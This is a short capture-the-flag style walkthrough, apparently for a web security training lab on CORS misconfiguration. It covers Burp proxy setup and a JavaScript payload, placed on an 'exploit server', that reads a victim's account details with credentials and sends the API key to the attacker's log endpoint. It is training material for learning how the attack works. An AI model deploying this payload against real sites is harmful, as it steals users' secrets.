# 1. Turn on Foxyproxy using Burp : #
* Proxy Type: HTTP<br>
* Proxy IP or DNS name: 127.0.0.1<br>
* Port: 8080<br>
* install ca.cert by access url: http://burp<br>
# 2. Login website with credential: wiener :: peter # 
# 3. Choose Go to exploit server#
# 4. Edit body request with follow code: #
```
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script> 
```
# 5. Click Store #
# 6. Click Deliver exploit to victim #
# 7. Click Access log #
# 8. Copy the request include api #
# 9. Using decoder function in burpsuite with url decode mode to retrieve the victim's API key
# 10. Submit the API to resolved the lab
